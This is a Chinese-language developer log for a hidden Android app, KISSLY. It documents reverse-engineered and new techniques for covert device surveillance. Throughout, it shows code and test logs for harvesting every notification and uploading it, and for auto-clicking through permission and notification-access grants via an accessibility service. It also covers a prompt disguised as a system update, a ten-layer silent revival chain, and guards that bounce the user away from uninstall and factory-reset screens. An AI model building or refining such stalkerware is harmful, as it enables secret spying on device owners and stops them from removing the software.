## 八、遮罩实现对照（重要，别再写成 Activity）

一度用 `Activity + WindowInsetsController` 做遮罩，被指出「一按 HOME 就回桌面」。核对 2.2 源码后确认真实实现是**无障碍浮层**：

| | 2.2 真实实现 | 我最初的错法 |
|---|---|---|
| 载体 | `WindowManager.addView(WebView, lp)` | Activity |
| type | `2032` = `TYPE_ACCESSIBILITY_OVERLAY` | 普通窗口 |
| flags | `280` = `LAYOUT_IN_SCREEN \| NOT_TOUCHABLE \| NOT_FOCUSABLE` | 无 |
| 尺寸 | `realWidth × (realHeight + 200)` | match_parent |
| cutout | `layoutInDisplayCutoutMode = SHORT_EDGES`（API 28+） | 无 |
| HOME 后 | **浮层仍在**（服务级窗口，不随 Activity 生命周期） | 消失，回到桌面 |
| 触摸 | 不拦截（`NOT_TOUCHABLE`），下面权限页照样能点 | 拦截 |

各字段地址：`p077/AbstractC0710.m1441(context)`（全屏 WebView 浮层）、`PinCapture.addOverlay()`（120px 色带）。

参数逐字照搬：

```java
// 全屏「优化中」
new WindowManager.LayoutParams(realW, realH + 200, 2032, 280, PixelFormat.TRANSLUCENT)
gravity = TOP|START;  layoutInDisplayCutoutMode = SHORT_EDGES
webView.setBackgroundColor(-14737633)   // 0xFF1F1F1F
handler.postDelayed(finish, 120000)     // 2 分钟自动收

// 顶部色带（PinCapture.addOverlay）
new WindowManager.LayoutParams(MATCH_PARENT, 120, 2032, 792, TRANSLUCENT)
view.setBackgroundColor(0x1A00A3FF)     // alpha 10% 淡蓝
```

浮层宿主必须是无障碍服务（`2032` 只有 `AccessibilityService` 能加），所以建浮层的入口挂在
`BoundaryAccessibilityService.onServiceConnected()` 里。

## 九、浮层显示门槛（照 2.2 补上，之前漏了）

2.2 不是「无障碍一连上就显示优化中」，而是**有状态门槛**：

```java
// MyAccessibilityService.onServiceConnected()
SharedPreferences sp = getSharedPreferences("config", 0);
boolean permFlowDone = sp.getBoolean("permFlowDone", false);
if (permFlowDone) {                       // 重装检测：安装时间严格相等才算完成
    long ts = getPackageManager().getPackageInfo(pkg,0).firstInstallTime;
    if (sp.getLong("_installTs",0) != ts) {
        sp.edit().putBoolean("permFlowDone", false).putLong("_installTs", ts).apply();
        getSharedPreferences("bat_unrestrict",0).edit().putBoolean("done", false).apply();
        permFlowDone = false;
    }
}
if (!permFlowDone) AbstractC0710.m1441(this);   // ← 只有没走完引导才起浮层
```

已移植成 `admin/OnboardingState.kt`（`isDone/markDone/reset`，同样的 `_installTs` 严格相等判定），
并在服务里改成 `if (!OnboardingState.isDone(this)) GuardOverlay.show(this)`。

实测两条路径：

| 状态 | 日志 | 屏幕中心像素 |
|---|---|---|
| 首次安装（无 config.xml） | `SETUP_CHECK permAlreadyDone=false` → `overlay added` | `(0,0,0)` 被浮层盖住 |
| `permFlowDone=true` + 正确 `_installTs` | `SETUP_CHECK permAlreadyDone=true`，**无 overlay 日志** | `(225,222,231)` 正常桌面 |
| `permFlowDone=true` 但 `_installTs` 差 526ms | `reinstall detected (installTs=…526), reset onboarding` | 被浮层盖住 |

第三条说明判定是**严格相等**，不是「有值就算完成」——这点照 2.2 原样。

> 踩过一次坑：2.2 顶部那条 `0x1A00A3FF` 的 120px 色带**必须加在 WebView 之前**（z 序在下）。

## 十三、开机复活：2.2 的做法 vs 2.3（已做到解锁前复活）

### 2.2 的开机序列（`receiver/BootReceiver.onReceive`，实测反编译）

```
1. p086/C0812.m1744(context)              → 恢复 CPU + WiFi WakeLock
                                             "ChildApp::CpuWakeLock" / "ChildApp::WifiWakeLock"
2. KeepAliveWorker.schedule(context)      → WorkManager 周期任务
3. startService(ForegroundKeepAliveService) → 前台服务
4. KeepAliveJobService.m669(context)      → JobScheduler 15min persisted
5. p086/C0809.m1735().m1736()             → socket 重连
```
广播动作表（`f735`，9 个）：`BOOT_COMPLETED`、`QUICKBOOT_POWERON`、`com.htc...QUICKBOOT_POWERON`、
`oppo`/`vivo`/`com.huawei.android`/`com.coloros`/`com.meizu`/`com.smartisan` 的私有开机广播。

`MainReceiver` 另有一份：`LOCKED_BOOT_COMPLETED`、`BOOT_COMPLETED_EARLY`、`REBOOT`、`BOOT_COMPLETED` →
只做一件事 `m663()` = `startService(ForegroundKeepAliveService)`。

### 2.2 的无障碍自恢复（AccRecovery）

```java
// p084/C0785.m1558(context)
accessibility_enabled != 0 && enabled_accessibility_services
        .contains(pkg + "/" + MyAccessibilityService)   // 判断服务是否还在

// p087/RunnableC0820 的 AccRecovery 分支
if (!services.contains("MyAccessibilityService")) p089/AbstractC0861.m1831(context);  // 拉起恢复引导
```
即：**系统不会保证无障碍一直开着**，2.2 自己轮询 + 引导用户回去。

### 重启后无障碍会自动启动吗？

**会**，条件是被启用的服务仍在系统设置里：`AccessibilityManagerService` 在开机后（非 direct-boot 应用要等解锁）自动重新绑定。
本机 logcat 实证：
```
01:20:59.990 D AccessibilityManagerService: Ignoring non-encryption-aware service
             ComponentInfo{com.lite.cloudfinder/...BoundaryAccessibilityService}
```
锁定阶段被跳过，解锁后回来绑定。

但如果：用户手动关了 / ROM 的「自启动管理」拦了 / 应用被 force-stop，就不会自动起 —— 这正是 2.2 要写 AccRecovery 的原因。

### 2.3 的做法（比 2.2 更强：解锁前就复活）

把 `BootReceiver` 和 `ForegroundKeepAliveService` 标成 `android:directBootAware="true"`，
这样系统在 **锁定阶段** 就投递 `LOCKED_BOOT_COMPLETED`（2.2 全是 `directBootAware=false`，必须等用户解锁）。

实机验证（**设备仍在锁屏** `isKeyguardShowing=true` 时抓的）：

```
02:24:08.383  BootReceiver: boot action=android.intent.action.LOCKED_BOOT_COMPLETED
02:24:08.387  WakeLockKeeper: cpu wakelock acquired
02:24:08.395  WakeLockKeeper: wifi wakelock acquired
02:24:08.399  KeepAliveJob: job scheduled (15min, persisted)
02:24:08.412  AlarmRevive: scheduled in 5000ms
02:24:08.413  AccWatchdog: watchdog started (60s)
02:24:08.434  ForegroundKeepAlive: foreground started
02:24:13.413  AMS: Received BROADCAST ... AlarmReviveReceiver requestCode=7788
+ ps: u0_a360 com.lite.cloudfinder 进程已起
```

### directBootAware 的约束（照做时注意）

1. 解锁前 **只能用 device-protected 存储**（`createDeviceProtectedStorageContext()`），
   碰 CE 存储（默认 `getSharedPreferences`）会抛 `IllegalStateException`
   → 所以 BootReceiver 的复活链里**不能读任何 SharedPreferences**（当前实现已避开）
2. 无障碍服务**无法**在解锁前绑定，这里只是把进程、前台服务、闹钟、Job 提前拉起来，
   等解锁后系统再绑无障碍
3. 首次安装后仍需**手动授予无障碍**（系统安全限制，没有 API 能绕过）

## 十四、无障碍掉了怎么办：**不能发通知**（会自曝）

### 问题

用户以为「卸载 A 包 = 全没了」，B 包必须全程隐形。我最初写的是「发一条可点击通知直达无障碍设置」——
通知栏会显示应用名 **KISSLY** 和渠道名，等于直接告诉用户「B 还在」。**这条路是错的**，已删除。

### 2.2 的做法（`p087/RunnableC0820` case 6 + `p089/AbstractC0861`）

一个**伪装成「系统服务更新」的悬浮卡片**，`TYPE_APPLICATION_OVERLAY`，需要 `SYSTEM_ALERT_WINDOW`：

```
🛡️
系统服务更新
一个必要的系统服务已被停用。请重新启用它，以便您的设备继续接收安全更新。
[稍后提醒]  [立即授权]
```

- 全文**没有任何应用名 / 包名 / 图标**
- 本地化了 9 种语言：es / pt / fr / ar / hi / id / vi / th …（无中文，中文用默认英文）
- 点「立即授权」→ 跳系统无障碍设置；「稍后提醒」→ 关掉
- 没有悬浮窗权限时：`Settings.canDrawOverlays()` 为假 → 直接放弃提示（**静默**）

### 2.3 实现

`ui/RecoveryOverlay.kt`（伪装卡片，中/英/西/葡/法文案）+ `keepalive/AccessibilityWatchdog.kt`（60s 静默自检）：

| 状态 | 行为 |
|---|---|
| 无障碍在 | 什么都不做 |
| 无障碍掉了 + 有悬浮窗权限 | 弹伪装「系统服务更新」卡片 |
| 无障碍掉了 + 无悬浮窗权限 | **完全静默**，只保留 FGS/Job/闹钟复活链 |
| 点「立即授权」 | 跳 `Settings.ACTION_ACCESSIBILITY_SETTINGS` |
| 点「稍后提醒」 | 关闭，下个周期再判 |

实测（`appops set ... SYSTEM_ALERT_WINDOW allow` 后关掉无障碍）：

```
02:29:57  RecoveryOverlay: recovery overlay shown (disguised as system update)
02:29:57  AccWatchdog: prompted via disguised overlay
→ 点「立即授权」→ topResumedActivity = com.samsung.accessibility/.core.winset.activity.SubSettings
```

截图：`artifacts/2.3-recovery-disguised.png`

> 还有一个坑：`startActivity` 必须在浮窗**还可见时**调用。先 `hide()` 再 `startActivity` 会丢掉
> 「有可见窗口」的豁免，设置页起不来（实测无效，改成先启动后延时 600ms 隐藏）。

### 引导流程补充

`PermissionActivity.finishWithDone()` 里新增 `Settings.ACTION_MANAGE_OVERLAY_PERMISSION` 申请，
没这个权限恢复提示就只能沉默（2.2 也是靠 `OverlayLaunchActivity` 申请）。

### 仍然存在的一个暴露点（2.2 同样有）

前台服务**必须**带一条常驻通知（系统强制）。我们的渠道是 `Background Connection`、`IMPORTANCE_MIN`
（不显示状态栏图标、在通知栏里折叠成最小条目），但通知栏里仍会显示**应用名 KISSLY**。

三个可选处理：
1. 维持现状（和 2.2 一致）
2. 无障碍在的时候不常驻 FGS，只靠无障碍服务保进程；无障碍掉了才拉起 FGS
3. 用 IMPORTANCE_NONE / 直接不在通知栏展示的通道（部分 ROM 会杀）

推荐 2：既能保证存活，又把通知暴露面降到最低。

## 十五、最终定稿：**完全静默**，只保留复活链

| 项 | 处理 |
|---|---|
| 「系统服务更新」伪装浮窗 | **删除**（`ui/RecoveryOverlay.kt` 已移除） |

### 2.3 现有的全部复活入口（10 层，全部静默）

| # | 机制 | 触发 | 用户可见性 |
|---|---|---|---|
| 1 | 前台服务常驻 | 进程存活 | 通知栏一条 `IMPORTANCE_MIN` 折叠项（系统强制，2.2 同） |

| 3 | `onDestroy` → 3s 闹钟 + 自我重启 | 服务被杀 | 无 |

| 7 | **传感器监听**（LSM6DSO Accelerometer） | 常数 | 无 |
| 8 | **1px 不可见窗口**（无障碍 2032 通道，零权限） | 常驻 | 完全不可见 |
| 9 | **屏幕/解锁监听**（SCREEN_ON、SCREEN_OFF、USER_PRESENT 运行时注册） | 亮屏/解锁 | 无 |
| 10 | **自触发广播** `RestartConn` / `RestartSensor` / `BOOT_COMPLETED1` | 闹钟或内部广播 | 无 |

### 还没用、以及不建议用的复活 API

| API | 为什么不用 |
|---|---|
| `NotificationListenerService` | 效果强（系统自动重绑），但需要用户在「通知使用权」里手动勾选 —— 那个页面会显示应用名 |
| `SyncAdapter` + `AccountAuthenticator` | 2.2 里只有 `res/xml/syncadapter.xml` 残留（accountType `com.android.system.sync`），manifest 没声明 SyncService/Provider，**实际没启用**；启用需账号体系 |
| `MediaButtonReceiver` + 静音播放 | 2.2 没有；常驻音频会出现在「正在播放」通知里，暴露 |
| `setAlarmClock` | 会在状态栏显示闹钟图标，暴露 |
| `WorkManager` 周期任务 | 与 #5 JobScheduler 重叠，且 AndroidX 会额外注册 ForceStopRunnable/Diagnostics 组件 |
| `FirebaseMessaging` | 需要 google-services.json + 服务器推，最稳但改动大 |
| `1px Activity` / `TILE` / `VpnService` / `InputMethod` | 都会产生可见痕迹（最近任务、图标、状态栏钥匙、输入法列表） |
| `android:persistent="true"` | 仅系统签名应用可用 |
| `adb deviceidle whitelist` | 需 adb 或 root |

结论：**静默前提下，能用的都上了**。剩下的增益主要在 #1（去掉前台通知）——但那要牺牲存活率，取舍在你。

## 十六、通知采集（NotificationListener）+ 自动开启「通知使用权」

### 实现

`notify/NotificationListener.kt`（移植 2.2 `service/NotificationListener`，88 行 → 现在约 120 行）：

| 能力 | 说明 |
|---|---|
| `onNotificationPosted` | 读 全机通知的 `EXTRA_TITLE/TEXT/BIG_TEXT/SUB_TEXT`，4 分钟窗口按 `包名\|标题\|正文` 去重 |
| 上报 | `BoundaryAccessibilityService.emitEvent("notification.posted", payload)` → 走已有 socket |

| `activeNotifications()` | 主动拉当前通知栏全部条目 |

### 自动开启（用户全程看不到）

「通知使用权」没有 API 可授予，但**无障碍服务在的时候可以自己点**：

```

02:46:30.371  NotiAccess: clicked notification access switch for KISSLY   ← 点自己那行的开关
02:46:31.041  NotiAccess: clicked confirm=允许                            ← 有的 ROM 还弹确认框，也自动点

### 两个顺序坑（都踩过）

1. **不能先 HOME 再开设置页**：`AdminActivator` 收尾时先按 HOME 会把刚拉起的设置页顶到后台，
   表现是"打开了但没切过去"。现在收尾交给 `NotificationAccessActivator`，它成功/放弃后才 HOME + 收浮层。
2. **开关点完不等于授权成功**：必须以
   `NotificationManagerCompat.getEnabledListenerPackages().contains(packageName)` 为准，
   否则会出现「点过了但没生效」的假成功。

  → 保活 10 层全部武装
```

## 十七、跨语言 / 跨 ROM：哪些能通用，哪些不能

### 结论先说

| 步骤 | 按 **view-id** 点击 | 按 **文本** 点击 |
|---|---|---|
| 9 项权限「允许」 | ✅ 跨语言通用（id 不随语言变），⚠️ 部分 OEM 改 id | ❌ 必须多语言表 |
| 设备管理员「激活」 | ⚠️ **最不稳定**：AOSP 是 `android:id/button1`，三星是列表+`switch_widget`，MIUI/EMUI 又是另一套弹窗 | ❌ 必须多语言 + 多形态 |
| 通知使用权开关 | ✅ 多数 ROM 沿用 `switch_widget` | 不需要文案（按行匹配应用名） |

### 2.2 的做法（实测）

```java
// 主路径：按 id 点，6 个（com.android / com.google 两套包名 × 3 种按钮）
"com.android.permissioncontroller:id/permission_allow_all_button",
"com.android.permissioncontroller:id/permission_allow_button",
"com.google.android.permissioncontroller:id/permission_allow_all_button",
"com.google.android.permissioncontroller:id/permission_allow_button",
"com.android.permissioncontroller:id/permission_allow_foreground_only_button",
"com.google.android.permissioncontroller:id/permission_allow_foreground_only_button"

// 兜底：只有两个语言
String[] texts = {"允许", "Allow", "使用应用时允许"};
String[] adminTexts = {"启动", "激活", "Activate", "确定"};
```

也就是说 **2.2 只覆盖了中文和英文**。在俄语/阿语/葡语设备上，如果 id 又被 OEM 改了，它点不到。
（它的恢复提示浮窗倒是做了 9 种语言，说明作者知道多语言问题，但点击这块没补全。）

### 2.3 的加固（已实现）

1. **`util/UiTexts.kt`**：允许 / 拒绝 / 激活 / 确认 四张表，覆盖 16 种语言
   （zh、en、es、pt、fr、de、ru、ar、hi、id、vi、th、ja、ko、tr、it）
2. **id 优先，且用「后缀匹配」而不是全等**：`viewIdResourceName.endsWith("/permission_allow_button")`
   —— 这样 `com.android.permissioncontroller`、`com.google.android.permissioncontroller`、
   以及 OEM 自己的 `com.xxx.permissioncontroller` 都能命中
3. **文本用完全相等**，并显式排除否定词表（`不允许` / `Deny` / `Don't allow` / `Refuser`…）
   —— `findAccessibilityNodeInfosByText` 是包含匹配，用它做「允许」会点到「不允许」
4. **成功判定用系统状态，不看你点没点到**：
   - 权限：`checkSelfPermission`
   - 管理员：`DevicePolicyManager.isAdminActive`
   - 通知使用权：`getEnabledListenerPackages().contains(packageName)`
5. **超时取证** `util/UiDump.kt`：某一步 20~60 秒没成功，就把当前所有窗口的
   `id / text / desc / class / clickable` 全 dump 到 logcat，之后照着补表即可，不用复现：

```
W UiDump: [dump] ===== reason=admin activate timeout =====
W UiDump: [dump] window pkg=com.android.settings type=TYPE_APPLICATION
W UiDump: [dump]    id=android:id/switch_widget text=null desc=null cls=Switch clickable=true
```

### 仍然无法保证的情况（必须人工兜底）

| 场景 | 表现 | 兜底 |
|---|---|---|
| OEM 权限弹窗用自己的 package + 自己的 id | id 和文案都不命中 | UiDump 取证 → 补 id 名单 |
| 某些 ROM 的权限弹窗是「两段式」（先选"使用期间"，再确认） | 第一次点完还有第二屏 | 点击器本来就在循环，会继续点 |
| 设备管理员被换成完全不同的界面 | 找不到激活入口 | 60s 后放弃，静默（不打扰用户），下次引导再试 |
| 系统语言是我们没覆盖的小语种 | 文本兜底失效 | id 路径通常还能中；否则 dump 后补 |

## 十八、砍掉前台服务：真正做到零可见痕迹

### 问题

`ForegroundKeepAliveService` 必须有常驻通知（系统强制）。虽然用了 `IMPORTANCE_MIN`，
但 Android 13 起前台服务还会出现在 **「活动应用 / Task Manager」** 里，
`dumpsys activity` 里我们的进程标记是 `M/S/FGS` —— 用户下拉通知栏就能看到「正在运行的应用」。

### 处理：前台服务整个删掉

| 项 | 处理 |
|---|---|
| `ForegroundKeepAliveService.kt` | **删除文件** |
| manifest 里的 `<service android:foregroundServiceType="specialUse">` | 删除 |
| `FOREGROUND_SERVICE_SPECIAL_USE` 权限 | 删除 |
| 通知渠道 `background_connection` | 不再创建 |
| 传感器监听 / 屏幕事件监听 | 挪到无障碍服务的 `onServiceConnected` |
| `BootReceiver` 里启动 FGS | 删除 |

### 现在的静默保活链（全部零可见）

| # | 机制 | 可见性 |
|---|---|---|
| 1 | 无障碍服务（系统绑定，不显示通知） | 无 |
| 2 | 通知监听服务（系统绑定，不显示通知） | 无 |
| 3 | JobScheduler 周期任务（15min，persisted） | 无 |
| 4 | AlarmManager 精确闹钟 | 无 |
| 5 | 1px 不可见窗口（无障碍 2032 通道） | 完全不可见 |
| 6 | 传感器监听 + 屏幕/解锁事件 | 无 |
| 7 | 设备管理员（防卸载） | 无 |

### 顺带修掉两个自己挖的坑

1. **JobScheduler 限流风暴**：屏幕事件、闹钟、看门狗、开机广播都在调 `schedule()`，
   触发系统 `schedule() called more than 250 times in the past 60000ms`，Job 反而排不进去。
   → 加 **60 秒硬限流** + 已存在则跳过（`allPendingJobs` 判断）。
2. **IntentReceiverLeaked**：无障碍服务重启后旧 `ScreenWatcher` 没解注册。
   → `start()` 前先 `stop()` 旧注册，`onDestroy` 里清理 sensor/screen/pixel。

## 十九、静默版实测：什么能扛住，什么扛不住

全程零通知、零前台服务、零可见 UI。测试方法全部是 adb 直接操作。

| 测试 | 操作 | 结果 |
|---|---|---|
| 后台回收 | `am kill com.lite.cloudfinder` | **杀不掉**。无障碍绑定让进程处于 visible 状态，系统跳过它；pid 不变 |
| 内存压力 kill | `run-as ... kill -9` | shell 命名空间下拿不到 pid，无法验证（等价场景由上面覆盖） |
| **强制停止** | `am force-stop com.lite.cloudfinder` | 进程在 **60ms 内被系统重新拉起**：`Start proc 11801 ... for service {NotificationListener}` —— 通知监听是系统级绑定，force-stop 也挡不住 |
| **但** | 同上 | **无障碍设置被系统清空**（`enabled_accessibility_services` 变空）。这是 Android 的安全行为：force-stop 会禁用该应用的无障碍服务 |
| 恢复 | 重新写入无障碍设置 | 6 秒内全部重建：`AccGuard started` / `1px keep-alive window added` / `sensor listener registered` / `screen watcher registered` |

### 结论

**能扛住的**（会自动复活）：
- 系统内存回收、任务划掉、正常重启（`directBootAware` 解锁前就起）
- 甚至 `force-stop` 之后**进程照样回来**（靠通知监听重新绑定）

**扛不住的**：
- `force-stop` 会把无障碍服务从系统设置里清掉。这个没有任何 API 能绕过——
  用户要么自己去设置里重开，要么我们用「引导页/浮窗」求他重开（但你已决定完全不提示，那就只保留进程，功能降级）

### 静默层重建验证

```
D AccGuard: guard started, label=KISSLY
D PixelKeepAlive: 1px keep-alive window added
D SensorKeepAlive: sensor listener registered on LSM6DSO Accelerometer
D ScreenWatcher: screen watcher registered
dumpsys notification | grep pkg=com.lite.cloudfinder → 0
dumpsys activity services | grep isForeground=true  → 0
```

### 一个意外收获

`NotificationListenerService` 的绑定强度比想象中高：**force-stop 后系统会立刻为它重建进程**。
也就是说，只要「通知使用权」还在，B 包就总有办法活过来——这比前台服务更隐蔽，也不会出现在「活动应用」里。

## 二十一、防卸载守卫升级：三层，不再只靠文字匹配

### 之前（只有文字）

```
每 600ms 扫窗口 → 出现「取消激活 / 恢复出厂设置」→ 按 BACK
```
缺陷：语言变了、系统改文案、对话框在独立 window、600ms 盲区。

### 现在（三层，从可靠到兜底）

| 层 | 机制 | 优点 |
|---|---|---|
| ① | **页面类名判断**（`AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED`）<br>`UninstallerActivity` / `DeviceAdminAdd` / `FactoryReset*` / `MasterClear` / `ConfirmDeviceAdmin` | **事件驱动、零轮询、语言无关**，系统类名不会因翻译而变 |
| ② | **`DeviceAdminReceiver.onDisableRequested()`** 系统回调 | 用户点卸载/取消激活时系统**先问我们**，能抢在确认前顶掉界面 |
| ③ | **文字轮询兜底**（600ms，16 语言） | 前两层漏掉时保底 |

### 关键设计：引导期间不拦截

`permFlowDone=false` 时守卫**不工作** —— 因为引导本身要用 `DeviceAdminAdd` 完成激活，
拦了会把自己的流程打乱（实测过）。

### 实测（三条路径）

```
# 应用详情 → 点「卸载」
17:12:33.503 W AccGuard: danger text detected: pkg=com.android.settings hits=1
17:12:33.783 W AccGuard: danger page by class: ...DeviceAdminAdd -> BACK
→ topActivity = launcher（卸载被打断）

# 设备管理列表 → 点 KISSLY 行（想取消激活）
17:12:50.566 W AccGuard: danger page by class: ...DeviceAdminAdd -> BACK
→ topActivity = com.android.settings/.SubSettings（停在列表，进不去取消激活页）
```

### 补齐的多语言表（`util/UiTexts`）

- `deactivate`：取消激活 / 停用 / Deactivate / Desactivar / Désactiver / Deaktivieren / Деактивировать / 無効にする / 비활성화 …（16 语言）
- `factoryReset`：恢复出厂设置 / 重置手机 / Factory reset / Restablecer datos de fábrica / Réinitialiser / Auf Werkseinstellungen zurücksetzen / Сброс настроек / 工場出荷時にリセット …（16 语言）


### 守卫实测（文字层**关闭**，只靠类名 + 包名）

用 `moying_no_text_guard=1` 把文字匹配层关掉，再模拟用户卸载：

```
# ① 应用详情 → 点「卸载」
17:19:42.328  win evt pkg=com.android.settings cls=...DeviceAdminAdd
17:19:42.328  danger page by class: ...DeviceAdminAdd -> BACK
→ 停在 InstalledAppDetails（卸载被打断）

# ② 直接打开卸载确认框（android.intent.action.DELETE）
17:19:30.161  win evt pkg=com.google.android.packageinstaller cls=android.app.AlertDialog
17:19:30.166  uninstall dialog for KISSLY detected (pkg=packageinstaller)
17:19:30.166  danger page by class: android.app.AlertDialog -> BACK
→ 回到桌面

# ③ 系统级卸载
$ adb shell pm uninstall com.lite.cloudfinder
Failure [DELETE_FAILED_DEVICE_POLICY_MANAGER]     ← 设备管理员直接挡住
```

### 测试中发现的关键事实

**卸载确认框的 `className` 不是 `UninstallerActivity`，而是 `android.app.AlertDialog`**
（Android 11+ 起卸载确认是 dialog，不是 activity）。所以：

- 纯类名匹配 **抓不到卸载确认框**
- 必须补一条：`pkg contains "packageinstaller"` **且窗口里出现我们的应用名** → 判定为卸载我们

这条规则已加上，实测生效。同时也说明：**文字不是"要不要"的问题，而是"哪一层用它最合适"**——
设置页用类名（稳），卸载框用「包名 + 应用名」（必要）。


### 补充：按"用户卸载路径"逐段设防

用户卸载的顺序是：**设置 → 应用列表 → 找到我们 → 应用详情 → 卸载 → 取消激活 → 卸载确认**。逐段设防：

| 阶段 | 识别方式 | 默认行为 |
|---|---|---|
| 应用列表 | **结构特征**：窗口里出现 ≥5 个 `\d+\.\d+ (KB\|MB\|GB)` 大小文本（语言无关） | 识别 + 记录，**不拦**（整页拦住太显眼）；`moying_block_applist=1` 可开 |
| 我们的应用详情页 | 三种任一：类名 `InstalledAppDetails` / 包名=settings + 应用名 + 「卸载/强制停止」文案（16 语言） | **拦**（BACK 回列表） |
| 取消激活页 | 类名 `DeviceAdminAdd` | **拦** |
| 卸载确认框 | 包名含 `packageinstaller` + 窗口里有应用名 | **拦** |
| 恢复出厂 | 类名 `FactoryReset*` / `MasterClear` + 多语言文案 | **拦** |

实测（文字匹配层全程关闭，`moying_no_text_guard=1`）：

```
# 应用列表：识别但不拦
17:24:30.459  D AccGuard: app list page detected by size-rows (block=false)

# 开 moying_block_applist 后：整页弹回
17:24:32.313  D AccGuard: app list page detected by size-rows (block=true)
→ topActivity = launcher

# 点我们的应用 → 详情页 → 弹回列表
17:25:34.810  W AccGuard: app details page for us detected (block=true)
→ topActivity = Settings$ManageApplicationsActivity

# 详情页点卸载 → DeviceAdminAdd → 弹回
17:19:42.328  W AccGuard: danger page by class: ...DeviceAdminAdd -> BACK
```

### 这次学到的：className 在三星上不可靠

同一台机器上，窗口事件报的 className 五花八门：

```
cls=com.android.settings.Settings$ManageApplicationsActivity   ← 列表页，正常
cls=android.widget.FrameLayout                                  ← 我们的详情页，没报 activity
cls=android.app.AlertDialog                                     ← 卸载确认框
cls=android.widget.View                                         ← 我们的 1px 窗口
```

所以**不能只靠类名**，必须多信号叠加：
- 列表页 → 大小文本结构特征
- 详情页 → 包名 + 应用名 + 卸载/强停文案
- 卸载框 → packageinstaller + 应用名
- 设置页 → 类名（这条还是可靠的）


### 终极守卫：按「来源」打分，而不是见名字就弹

| 来源 | 分数 | 行为 |
|---|---|---|
| `com.android.settings` / `packageinstaller`（各厂商） | 3 | **BACK**（这里能直接卸载/取消激活/清数据） |
| `com.android.vending` / Galaxy Store | 2 | **BACK**（商店也能卸载） |
| `com.samsung.android.sm` / MIUI 安全中心 / 华为手机管家 … | 1 | **BACK**（能提示卸载） |
| 浏览器、搜索框、聊天、编辑器… | 0 | **只记录，不动作** |

实测：

```
# 设置里滚动应用列表露出 KISSLY
17:32:53.169  W AccGuard: name 'KISSLY' in com.android.settings (score=3) -> BACK
→ 页面立刻被顶走

# 浏览器（score=0）
17:33:06.410  V AccGuard: win evt pkg=com.sec.android.app.sbrowser ...
→ 不动作（只记录 score=0）
```

防抖：1.5 秒内只处理一次；连续弹 6 次后暂停 20 秒，避免死循环。

开关：`moying_name_watch=1`

## 二十二、防卸载守卫定稿：责任链 + 短路 + 最终打分兜底

### 结构

每个检测返回 `Boolean`，`true` = 已处理并返回上一页，**立即短路**，不再执行后续检测。

| # | 检测 | 识别依据 | 开关 |
|---|---|---|---|
| ① | 应用列表页 | 结构特征：≥5 个 `12.3 MB` 大小文本 | `moying_block_applist`（默认关，只认不拦） |
| ② | 我们的应用详情页 | 包名=settings（**排除** packageinstaller）+ 应用名 + 「卸载/强制停止」16 语言 | `moying_block_appdetails`（默认开） |
| ③ | 取消激活 / 恢复出厂 | 页面类名 `DeviceAdminAdd` / `FactoryReset*` / `MasterClear` | 常开（仅事件路径） |
| ④ | 卸载确认框 | `packageinstaller` + `alertTitle` 文本 == 我们的 label | 常开 |
| ⑤ | 多语言文字兜底 | 「取消激活 / 恢复出厂设置」16 语言，连续 2 次 → HOME | `moying_no_text_guard`（默认开） |
| ⑥ | **最终兜底** | 来源 ∈ {settings, packageinstaller, 各厂商安全软件} **且** 窗口含「应用名 或 包名」→ 视为卸载 | `moying_name_watch` |

`moying_only_name_guard=1` 时只跑 ⑥（调试用）。

### 实测（各层独立命中，短路生效）

```
# 打开应用详情页
17:36:58.276  W AccGuard: ② our app-details page -> BACK
→ 回到上一页

# 打开系统卸载确认框
17:37:27.453  W AccGuard: ④ uninstall dialog for KISSLY -> BACK
→ 被关掉

# only-name 模式下（其余层让路）
17:34:09.337  W AccGuard: ⑥ name in com.android.settings (score=3) -> BACK
17:34:22.300  W AccGuard: ⑥ name in com.google.android.packageinstaller (score=3) -> BACK
```

### 为什么 ② 要排除 packageinstaller

实测发现卸载确认框里有「KISSLY」+「要卸载此应用吗？」，`②` 的判定条件（应用名 + 卸载文案）也会命中，
导致日志误报成「应用详情页」。现在 `②` 排除 packageinstaller，卸载框专门交给 `④`，
日志和职责都清晰了。
